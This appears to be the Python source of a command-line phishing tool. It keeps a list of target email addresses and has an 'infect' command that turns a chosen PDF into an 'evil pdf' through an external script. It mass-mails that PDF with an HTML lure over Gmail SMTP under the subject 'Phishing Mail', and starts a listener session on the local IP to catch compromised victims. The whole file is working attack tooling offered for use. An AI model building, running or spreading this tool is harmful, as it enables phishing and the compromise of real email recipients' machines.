import os
from posix import write
import smtplib
import subprocess
import shutil
from pathlib import Path
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from configparser import ConfigParser
from colorama.initialise import reset_all
from colorama import Fore
from colorama import Style
import socket
import base64

cfg = ConfigParser()
cfg.read("cfg.ini")

def getIp():
    try:
        cfg["general"]["ip"] = socket.gethostbyname(socket.gethostname())
    except socket.gaierror:
        print(f"{Fore.RED}Error:{Style.RESET_ALL}There was an error resolving the hostname.")
        cfg["general"]["ip"] = input("Enter your ipv4 address: ")
    except Exception as e:
        print(f"{Fore.RED}Error:{Style.RESET_ALL}unexpected error ocurred: {e}")
        cfg["general"]["ip"] = input("Enter your ipv4 address: ")

def checkfiles(direc) -> list:
    subprocess.run(f"ls {direc} > data/storage.txt", shell=True)
    files = open("data/storage.txt", "r").readlines()
    for file in files:
        file.removesuffix("\n")
    return files

def cfgUpdate():
    with open('cfg.ini', 'w') as configfile:
        cfg.write(configfile)

def quit(cmd):
    exit(0)

def setmail(cmd):
    emails = cmd[1].split(";")
    for email in emails:
        if "@" in email:
            cfg["mails"][email] = email
            cfgUpdate()
            print(f"{Fore.GREEN}Success:{Style.RESET_ALL} set {Fore.BLUE}{email}{Style.RESET_ALL} as a mail")
        else:
            print(f"{Fore.RED}Error:{Style.RESET_ALL} {Fore.BLUE}{email}{Style.RESET_ALL} is not a regular email address")

def removemail(cmd):
    for mail in cfg["mails"]:
        if cmd[1] == "all":
            cfg.remove_option("mails", mail)
            print(f"{Fore.GREEN}Success:{Style.RESET_ALL} {Fore.BLUE}{mail}{Style.RESET_ALL} is removed")
        elif mail == cmd[1]:
            cfg.remove_option("mails", mail)
            print(f"{Fore.GREEN}Success:{Style.RESET_ALL} {Fore.BLUE}{mail}{Style.RESET_ALL} is removed")
        cfgUpdate()

def showmail(cmd):
    for key in cfg["mails"]:
        print(key)

def removepdf(cmd):
    try:
        try:
            os.remove(f"futures/{cmd[1]}")
        except:
            print(f"{Fore.RED}Error:{Style.RESET_ALL} {Fore.BLUE}{cmd[1]}{Style.RESET_ALL} is not a stored pdf")
    except:
        print(f"{Fore.RED}Error:{Style.RESET_ALL} {Fore.BLUE}{cmd[0]}:{Style.RESET_ALL} no input is set")

def showpdf(cmd):
    pdfs = checkfiles("futures")
    if pdfs != []:
        for pdf in pdfs:
            if pdf.removesuffix("\n") != "":
                print(pdf.removesuffix("\n"))
    else:
        print(f"{Fore.RED}Error:{Style.RESET_ALL} {Fore.BLUE}{cmd[0]}:{Style.RESET_ALL} no pdf is set")

def setpdf(cmd):
    future = checkfiles("futures")
    if checkfiles("futures") == []:
        try:
            if cmd[1].endswith(".pdf") == True:
                try:
                    shutil.copyfile(cmd[1], "futures/" + Path(cmd[1]).stem + ".pdf")
                    print(f"{Fore.GREEN}Success:{Style.RESET_ALL} {Fore.BLUE}{cmd[1]}{Style.RESET_ALL} gonna be a future evil pdf")
                except:
                    print(f"{Fore.RED}Error:{Style.RESET_ALL} There is no such file / directory: {Fore.BLUE}{cmd[1]}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Error:{Style.RESET_ALL} Wrong input-file: {Fore.BLUE}{cmd[1]}{Style.RESET_ALL} is not a PDF!")
        except:
            print(f"{Fore.RED}Error:{Style.RESET_ALL} {Fore.BLUE}{cmd[0]}:{Style.RESET_ALL} no input is set")
    else:
        print(f"{Fore.RED}Error:{Style.RESET_ALL} {Fore.BLUE}{future[0]}:{Style.RESET_ALL} is already set as a pdf.")

def convert(cmd):
    subprocess.call(["script/convert.sh", checkfiles("futures")[0]])

def sendmail(cmd):
    subject = "Phishing Mail"
    sender_email = cfg["general"]["add"]
    password = cfg["general"]["passw"]
    # evilpdf = checkfiles("futures")[0]
    evilpdf = "futures/dummy-2.pdf"

    message = MIMEMultipart()
    message["From"] = sender_email
    message["Subject"] = subject

    html = open("html/template.html").read().format(link="https://www.google.com")
    message.attach(MIMEText(html, 'html'))

    with open(evilpdf, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {evilpdf}",
    )
    message.attach(part)

    text = message.as_string()

    emails = []
    for key in cfg["mails"]:
        emails.append(key)

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender_email, password)
        for email in emails:
            server.sendmail(sender_email, email, text)
            print(f"{Fore.GREEN}Success:{Style.RESET_ALL} send an evil email to {Fore.BLUE}{email}{Style.RESET_ALL}")

def listen(cmd):
    try:
        subprocess.call(["script/startsession.sh", cfg["general"]["ip"]])
    except:
        print(f"{Fore.RED}Error:{Style.RESET_ALL} there is no evil PDF to host")

cmds = {
    "setmail": setmail,
    "sendmail": sendmail,
    "setpdf": setpdf,
    "infect": convert,
    "exit": quit,
    "showmail": showmail,
    "listen": listen,
    "removemail": removemail,
    "removepdf": removepdf,
    "showpdf": showpdf,
}

if __name__ == "__main__":
    if input("configure? y/n ") == "y":
        cfg["general"]["add"] = input("email: ")
        cfg["general"]["passw"] = input("password: ")
        getIp()
        cfgUpdate()
        print(cfg["general"]["ip"])

    while True:
        cmd = input(": ").split(" ")
        if cmd[0] in cmds:
            cmds[cmd[0]](cmd)
        else:
            print(f"{Fore.RED}Error:{Style.RESET_ALL} wrong command: {Fore.BLUE}{cmd[0]}{Style.RESET_ALL}")


# tvqh chzt egje sxsc
# "das ist ein schöner tag".split(" ")
# array = [das, ist, schöer, tag]
